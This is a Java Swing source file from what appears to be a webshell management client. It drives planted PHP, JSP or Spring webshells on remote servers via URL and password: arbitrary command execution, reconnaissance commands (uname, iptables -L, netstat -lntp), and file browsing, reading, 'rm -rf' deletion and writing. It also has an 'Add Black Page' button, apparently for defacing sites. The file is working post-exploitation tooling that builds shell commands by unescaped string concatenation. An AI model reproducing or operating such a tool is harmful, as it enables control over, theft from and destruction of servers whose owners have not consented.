package com.atlant1c.view;

import com.atlant1c.connect.JspConnect;
import com.atlant1c.connect.PhpConnect;
import com.atlant1c.connect.SpringConnect;
import com.atlant1c.utils.AddBlackPage;

import javax.swing.*;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;
import javax.swing.tree.TreePath;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.Arrays;
import java.util.List;

public class Management extends JPanel {

    private String id;
    private String url;
    private String password;
    private String payload;

    private JTextArea outputArea;
    private JTextField inputField;
    private CardLayout cardLayout;
    private JPanel cardPanel;
    private JTree fileTree;
    private DefaultTreeModel treeModel;

    private String value;

    public Management(String id, String url, String password, String payload,String value) {
        this.id = id;
        this.url = url;
        this.password = password;
        this.payload = payload;
        this.value = value ;


        setLayout(new BorderLayout());

        JPanel topPanel = new JPanel();
        topPanel.setLayout(new BorderLayout());

        JLabel infoLabel = new JLabel("ID: " + id + " | URL: " + url + " | Payload: " + payload);
        infoLabel.setFont(new Font("Serif", Font.PLAIN, 14)); // 设置支持中文的字体
        topPanel.add(infoLabel, BorderLayout.NORTH);

        JPanel buttonPanel = new JPanel();
        buttonPanel.setLayout(new FlowLayout(FlowLayout.LEFT));

        JButton infoButton = new JButton("Basic Info");
        styleButton(infoButton);
        infoButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                cardLayout.show(cardPanel, "infoPanel");
                fetchBasicInfo();
            }
        });
        buttonPanel.add(infoButton);

        JButton commandButton = new JButton("Command Execution");
        styleButton(commandButton);
        commandButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                cardLayout.show(cardPanel, "commandPanel");
                inputField.requestFocus();
            }
        });
        buttonPanel.add(commandButton);

        JButton fileButton = new JButton("File Management");
        styleButton(fileButton);
        fileButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                cardLayout.show(cardPanel, "filePanel");
                manageFiles();
            }
        });
        buttonPanel.add(fileButton);

        if ("PHP".equals(payload)) {
            JButton addBlackPageButton = new JButton("Add Black Page");
            styleButton(addBlackPageButton);
            addBlackPageButton.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent e) {
                    AddBlackPage.addBlackPage(url, password);
                }
            });
            buttonPanel.add(addBlackPageButton);
        }

        topPanel.add(buttonPanel, BorderLayout.SOUTH);
        add(topPanel, BorderLayout.NORTH);

        cardLayout = new CardLayout();
        cardPanel = new JPanel(cardLayout);

        JPanel infoPanel = new JPanel(new BorderLayout());
        outputArea = new JTextArea();
        outputArea.setEditable(false);
        outputArea.setFont(new Font("Serif", Font.PLAIN, 14)); // 设置支持中文的字体
        JScrollPane infoScrollPane = new JScrollPane(outputArea);
        infoPanel.add(infoScrollPane, BorderLayout.CENTER);

        JPanel commandPanel = new JPanel(new BorderLayout());
        JTextArea commandOutputArea = new JTextArea();
        commandOutputArea.setEditable(false);
        commandOutputArea.setFont(new Font("Serif", Font.PLAIN, 14)); // 设置支持中文的字体
        JScrollPane commandScrollPane = new JScrollPane(commandOutputArea);
        commandPanel.add(commandScrollPane, BorderLayout.CENTER);

        inputField = new JTextField();
        inputField.setToolTipText("Enter command and press Enter to execute");
        inputField.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                executeCommand(inputField.getText(), commandOutputArea);
                inputField.setText("");
            }
        });
        inputField.setFont(new Font("Serif", Font.PLAIN, 14)); // 设置支持中文的字体
        commandPanel.add(inputField, BorderLayout.SOUTH);

        JPanel filePanel = new JPanel(new BorderLayout());
        fileTree = new JTree();
        JScrollPane fileScrollPane = new JScrollPane(fileTree);
        filePanel.add(fileScrollPane, BorderLayout.CENTER);

        JPanel fileButtonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));

        JButton viewButton = new JButton("View File");
        styleButton(viewButton);
        viewButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                viewFile();
            }
        });
        fileButtonPanel.add(viewButton);

        JButton deleteButton = new JButton("Delete File");
        styleButton(deleteButton);
        deleteButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                deleteFile();
            }
        });
        fileButtonPanel.add(deleteButton);

        JButton addButton = new JButton("Add File");
        styleButton(addButton);
        addButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                addFile();
            }
        });
        fileButtonPanel.add(addButton);

        filePanel.add(fileButtonPanel, BorderLayout.NORTH);
        cardPanel.add(infoPanel, "infoPanel");
        cardPanel.add(commandPanel, "commandPanel");
        cardPanel.add(filePanel, "filePanel");

        add(cardPanel, BorderLayout.CENTER);

        // Initialize file tree
        manageFiles();
    }

    private void styleButton(JButton button) {
        button.setFont(new Font("Arial", Font.PLAIN, 14));
        button.setBackground(new Color(70, 130, 180));
        button.setForeground(Color.WHITE);
        button.setFocusPainted(false);
        button.setBorder(BorderFactory.createEmptyBorder(5, 15, 5, 15));
    }

    private void fetchBasicInfo() {
        List<String> commands = Arrays.asList(
                "uname -a",        // 查看内核/操作系统/CPU信息
                "hostname",        // 查看计算机名
                "uptime",          // 查看系统运行时间、用户数、负载
                "ifconfig",        // 查看所有网络接口的属性
                "iptables -L",     // 查看防火墙设置
                "netstat -lntp",   // 查看所有监听端口
                "chkconfig --list", // 列出所有系统服务
                "chkconfig --list | grep on" // 列出所有启动的系统服务程序
        );

        outputArea.setText("");  // 清空输出区域
        for (String command : commands) {
            executeCommand(command, outputArea);
        }
    }

    private void manageFiles() {
        String currentPath = executeCommandAndGetResponse("pwd");
        DefaultMutableTreeNode root = new DefaultMutableTreeNode(currentPath);
        buildFileTree(root, currentPath);
        treeModel = new DefaultTreeModel(root);
        fileTree.setModel(treeModel);
    }

    private void buildFileTree(DefaultMutableTreeNode node, String path) {
        String command = "ls -l " + path;
        String response = executeCommandAndGetResponse(command);
        if (response != null) {
            String[] lines = response.split("\n");
            for (String line : lines) {
                // 解析每一行
                String[] parts = line.split("\\s+");
                if (parts.length >= 9) { // 至少有9个部分，确保它是一个有效的ls -l输出行
                    String fileName = parts[parts.length - 1]; // 最后一个部分是文件名
                    if (!fileName.equals(".") && !fileName.equals("..")) { // 排除当前目录和上级目录
                        DefaultMutableTreeNode childNode = new DefaultMutableTreeNode(fileName);
                        node.add(childNode);
                        // 如果是目录，递归调用
                        if (isDirectory(path + "/" + fileName)) {
                            buildFileTree(childNode, path + "/" + fileName);
                        }
                    }
                }
            }
        }
    }

    private boolean isDirectory(String path) {
        String command = "[ -d \"" + path + "\" ] && echo true || echo false";
        String response = executeCommandAndGetResponse(command);
        return "true".equals(response.trim());
    }

    private void viewFile() {
        TreePath path = fileTree.getSelectionPath();
        if (path != null) {
            String filePath = buildFilePath(path);
            String command = "cat " + filePath;
            String response = executeCommandAndGetResponse(command);
            if (response != null) {
                outputArea.setText(response);
                cardLayout.show(cardPanel, "infoPanel");
            }
        } else {
            JOptionPane.showMessageDialog(this, "Please select a file", "Information", JOptionPane.INFORMATION_MESSAGE);
        }
    }

    private void deleteFile() {
        TreePath path = fileTree.getSelectionPath();
        if (path != null) {
            String filePath = buildFilePath(path);
            int confirm = JOptionPane.showConfirmDialog(this, "Are you sure you want to delete this file?", "Confirm", JOptionPane.YES_NO_OPTION);
            if (confirm == JOptionPane.YES_OPTION) {
                String command = "rm -rf " + filePath;
                String response = executeCommandAndGetResponse(command);
                if (response != null) {
                    JOptionPane.showMessageDialog(this, "File deleted successfully", "Success", JOptionPane.INFORMATION_MESSAGE);
                    manageFiles();
                } else {
                    JOptionPane.showMessageDialog(this, "Failed to delete file", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        } else {
            JOptionPane.showMessageDialog(this, "Please select a file", "Information", JOptionPane.INFORMATION_MESSAGE);
        }
    }

    private void addFile() {
        String filePath = JOptionPane.showInputDialog(this, "Enter file path:");
        if (filePath != null && !filePath.trim().isEmpty()) {
            String content = JOptionPane.showInputDialog(this, "Enter file content:");
            if (content != null) {
                String command = "echo \"" + content + "\" > " + filePath;
                String response = executeCommandAndGetResponse(command);
                if (response != null) {
                    JOptionPane.showMessageDialog(this, "File added successfully", "Success", JOptionPane.INFORMATION_MESSAGE);
                    manageFiles();
                } else {
                    JOptionPane.showMessageDialog(this, "Failed to add file", "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
        }
    }

    private String buildFilePath(TreePath treePath) {
        Object[] paths = treePath.getPath();
        StringBuilder filePath = new StringBuilder();
        for (int i = 0; i < paths.length; i++) {
            filePath.append(paths[i]);
            if (i < paths.length - 1) {
                filePath.append(File.separator);
            }
        }
        return filePath.toString();
    }

    private String executeCommandAndGetResponse(String command) {
        if ("PHP".equals(payload)) {
            return PhpConnect.executeCommand(url, password, command);
        } else if ("JSP(Tomcat)".equals(payload)) {
            return JspConnect.executeCommand(url, password, command);
        } else if ("Spring".equals(payload)) {
            return SpringConnect.executeCommand(url, password, command, value);
        } else {
            return "Unsupported payload type";
        }
    }

    private void executeCommand(String command, JTextArea outputArea) {
        String response = executeCommandAndGetResponse(command);
        if (response != null) {
            outputArea.append(response + "\n");
        } else {
            outputArea.append("Command execution failed\n");
        }
    }
}
